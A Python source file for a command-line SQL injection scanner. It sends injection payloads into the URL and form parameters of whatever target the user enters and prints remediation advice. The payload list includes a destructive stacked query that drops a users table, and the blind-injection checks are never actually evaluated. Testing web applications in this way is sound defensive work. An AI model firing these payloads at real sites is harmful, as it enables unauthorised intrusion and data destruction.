import re
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Tuple
import json
from datetime import datetime

class SQLInjectionScanner:
    def __init__(self):
        """Initialize the SQL Injection Vulnerability Scanner."""
        self.vulnerable_parameters = []
        self.test_payloads = self._get_payloads()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.timeout = 10

    def _get_payloads(self) -> List[Dict]:
        """
        Get SQL injection test payloads.
        
        Returns:
            List[Dict]: List of payload dictionaries with name, payload, and pattern
        """
        return [
            {
                "name": "Basic Single Quote",
                "payload": "'",
                "pattern": r"(SQL syntax|mysql_fetch|Warning|error in your SQL)",
                "type": "error-based"
            },
            {
                "name": "Comment Injection",
                "payload": "' OR '1'='1",
                "pattern": r"(SQL syntax|mysql_fetch|Warning|error in your SQL)",
                "type": "error-based"
            },
            {
                "name": "Boolean-based Blind",
                "payload": "' AND '1'='1",
                "pattern": None,
                "type": "boolean-based"
            },
            {
                "name": "Boolean-based Blind OR",
                "payload": "' OR '1'='1' --",
                "pattern": None,
                "type": "boolean-based"
            },
            {
                "name": "Time-based Blind",
                "payload": "'; WAITFOR DELAY '00:00:05'-- ",
                "pattern": None,
                "type": "time-based"
            },
            {
                "name": "UNION-based",
                "payload": "' UNION SELECT NULL,NULL,NULL-- -",
                "pattern": r"(SQL syntax|mysql_fetch|Warning)",
                "type": "union-based"
            },
            {
                "name": "Stacked Queries",
                "payload": "'; DROP TABLE users-- ",
                "pattern": r"(SQL syntax|mysql_fetch|Warning)",
                "type": "stacked"
            },
            {
                "name": "Double Quote Injection",
                "payload": '"',
                "pattern": r"(SQL syntax|mysql_fetch|Warning)",
                "type": "error-based"
            },
            {
                "name": "Backtick Injection",
                "payload": "`",
                "pattern": r"(SQL syntax|mysql_fetch|Warning)",
                "type": "error-based"
            },
            {
                "name": "Encoding Bypass (URL Encoded)",
                "payload": "%27",
                "pattern": r"(SQL syntax|mysql_fetch|Warning)",
                "type": "encoded"
            }
        ]

    def extract_parameters(self, url: str) -> List[str]:
        """
        Extract all parameters from a URL.
        
        Args:
            url (str): Target URL
            
        Returns:
            List[str]: List of parameter names
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def test_url_parameter(self, url: str, param: str) -> List[Dict]:
        """
        Test a URL parameter for SQL injection vulnerability.
        
        Args:
            url (str): Target URL
            param (str): Parameter to test
            
        Returns:
            List[Dict]: List of vulnerable payloads found
        """
        vulnerabilities = []

        for payload_data in self.test_payloads:
            test_url = self._build_payload_url(url, param, payload_data["payload"])
            
            try:
                print(f"  Testing {param} with: {payload_data['name']}...", end=" ")
                response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
                
                if payload_data["pattern"]:
                    if re.search(payload_data["pattern"], response.text, re.IGNORECASE):
                        print("⚠️  VULNERABLE")
                        vulnerabilities.append({
                            "parameter": param,
                            "payload_name": payload_data["name"],
                            "payload": payload_data["payload"],
                            "type": payload_data["type"],
                            "status_code": response.status_code,
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
                    else:
                        print("✓ OK")
                else:
                    print("✓ OK (No pattern check)")
                    
            except requests.exceptions.Timeout:
                print("⏱️  TIMEOUT")
            except requests.exceptions.RequestException as e:
                print(f"❌ ERROR: {str(e)[:30]}")

        return vulnerabilities

    def _build_payload_url(self, url: str, param: str, payload: str) -> str:
        """
        Build a URL with SQL injection payload.
        
        Args:
            url (str): Base URL
            param (str): Parameter name
            payload (str): Payload to inject
            
        Returns:
            str: URL with payload
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = "&".join([f"{k}={v[0]}" for k, v in params.items()])
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def test_post_data(self, url: str, data: Dict) -> List[Dict]:
        """
        Test POST data for SQL injection vulnerability.
        
        Args:
            url (str): Target URL
            data (Dict): POST data dictionary
            
        Returns:
            List[Dict]: List of vulnerable parameters found
        """
        vulnerabilities = []

        for param, value in data.items():
            print(f"\nTesting POST parameter: {param}")
            
            for payload_data in self.test_payloads:
                test_data = data.copy()
                test_data[param] = payload_data["payload"]
                
                try:
                    print(f"  Testing with: {payload_data['name']}...", end=" ")
                    response = requests.post(url, data=test_data, headers=self.headers, timeout=self.timeout)
                    
                    if payload_data["pattern"]:
                        if re.search(payload_data["pattern"], response.text, re.IGNORECASE):
                            print("⚠️  VULNERABLE")
                            vulnerabilities.append({
                                "parameter": param,
                                "payload_name": payload_data["name"],
                                "payload": payload_data["payload"],
                                "type": payload_data["type"],
                                "method": "POST",
                                "status_code": response.status_code,
                                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            })
                        else:
                            print("✓ OK")
                    else:
                        print("✓ OK (No pattern check)")
                        
                except requests.exceptions.Timeout:
                    print("⏱️  TIMEOUT")
                except requests.exceptions.RequestException as e:
                    print(f"❌ ERROR: {str(e)[:30]}")

        return vulnerabilities

    def scan_url(self, url: str) -> Dict:
        """
        Scan a URL for SQL injection vulnerabilities.
        
        Args:
            url (str): Target URL to scan
            
        Returns:
            Dict: Scan results
        """
        print(f"\n{'='*70}")
        print(f"🔍 SQL INJECTION VULNERABILITY SCANNER")
        print(f"{'='*70}")
        print(f"Target URL: {url}")
        print(f"Scan Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*70}\n")

        parameters = self.extract_parameters(url)
        
        if not parameters:
            print("⚠️  No URL parameters found for testing.")
            return {"url": url, "vulnerabilities": [], "parameters_tested": 0}

        print(f"Found {len(parameters)} parameter(s) to test: {', '.join(parameters)}\n")

        all_vulnerabilities = []

        for param in parameters:
            print(f"\nTesting parameter: {param}")
            vulns = self.test_url_parameter(url, param)
            all_vulnerabilities.extend(vulns)

        return {
            "url": url,
            "parameters_tested": len(parameters),
            "vulnerabilities_found": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "scan_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

    def display_results(self, results: Dict):
        """
        Display scan results in a formatted manner.
        
        Args:
            results (Dict): Scan results
        """
        print(f"\n{'='*70}")
        print(f"📊 SCAN RESULTS")
        print(f"{'='*70}")
        print(f"URL: {results['url']}")
        print(f"Parameters Tested: {results['parameters_tested']}")
        print(f"Vulnerabilities Found: {results['vulnerabilities_found']}")
        print(f"Scan Time: {results['scan_time']}")
        print(f"{'='*70}\n")

        if results['vulnerabilities']:
            print("⚠️  VULNERABLE PARAMETERS DETECTED:\n")
            for i, vuln in enumerate(results['vulnerabilities'], 1):
                print(f"{i}. Parameter: {vuln['parameter']}")
                print(f"   Payload Type: {vuln['payload_name']} ({vuln['type']})")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Status Code: {vuln['status_code']}")
                print()
        else:
            print("✓ No SQL injection vulnerabilities detected!")

        print(f"{'='*70}\n")

    def save_report(self, results: Dict, filename: str = "sql_injection_report.json"):
        """
        Save scan results to a JSON report file.
        
        Args:
            results (Dict): Scan results
            filename (str): Output filename
        """
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"✓ Report saved to: {filename}\n")
        except IOError as e:
            print(f"❌ Error saving report: {e}\n")

    def get_remediation_advice(self) -> str:
        """
        Get remediation advice for SQL injection vulnerabilities.
        
        Returns:
            str: Remediation recommendations
        """
        advice = """
        {'='*70}
        🛡️  SQL INJECTION REMEDIATION RECOMMENDATIONS
        {'='*70}
        
        1. USE PARAMETERIZED QUERIES (Prepared Statements)
           - Use placeholders (?) instead of string concatenation
           - Example: SELECT * FROM users WHERE id = ? AND name = ?
        
        2. INPUT VALIDATION
           - Validate all user inputs on the server side
           - Use whitelisting instead of blacklisting
           - Check data type, length, and format
        
        3. LEAST PRIVILEGE PRINCIPLE
           - Grant database users only necessary permissions
           - Use separate accounts for different operations
           - Avoid using administrative credentials
        
        4. ESCAPE USER INPUT
           - Use database-specific escaping functions
           - Example: mysql_real_escape_string() or mysqli::real_escape_string()
        
        5. ERROR HANDLING
           - Don't display detailed database errors to users
           - Log errors securely on the server
           - Show generic error messages to users
        
        6. WEB APPLICATION FIREWALL (WAF)
           - Deploy a WAF to filter malicious requests
           - Use ModSecurity or similar solutions
        
        7. REGULAR SECURITY TESTING
           - Perform regular penetration testing
           - Use automated scanning tools
           - Conduct code reviews
        
        8. SECURITY HEADERS
           - Implement Content Security Policy (CSP)
           - Use X-XSS-Protection headers
        
        9. KEEP SOFTWARE UPDATED
           - Update frameworks and libraries regularly
           - Apply security patches promptly
        
        10. SECURITY TRAINING
            - Train developers on secure coding practices
            - Conduct security awareness programs
        
        {'='*70}
        """
        return advice


def main():
    """Main application interface."""
    scanner = SQLInjectionScanner()

    print(f"\n{'='*70}")
    print(f"🔒 SQL INJECTION VULNERABILITY SCANNER v1.0")
    print(f"{'='*70}\n")

    while True:
        print("1. Scan URL for SQL Injection")
        print("2. Get Remediation Advice")
        print("3. Exit")
        print()

        choice = input("Enter your choice (1-3): ").strip()

        if choice == "1":
            url = input("\nEnter the target URL (with parameters): ").strip()
            
            if not url.startswith(('http://', 'https://')):
                print("❌ Invalid URL. Please include http:// or https://")
                continue

            try:
                results = scanner.scan_url(url)
                scanner.display_results(results)
                
                save = input("Save report? (yes/no): ").strip().lower()
                if save == "yes":
                    filename = input("Enter filename (default: sql_injection_report.json): ").strip()
                    if not filename:
                        filename = "sql_injection_report.json"
                    scanner.save_report(results, filename)
                    
            except requests.exceptions.ConnectionError:
                print("❌ Connection error. Please check the URL and try again.")
            except Exception as e:
                print(f"❌ Error: {e}")

        elif choice == "2":
            print(scanner.get_remediation_advice())

        elif choice == "3":
            print("\nThank you for using SQL Injection Scanner. Goodbye! 👋\n")
            break

        else:
            print("❌ Invalid choice. Please try again.\n")


if __name__ == "__main__":
    main()
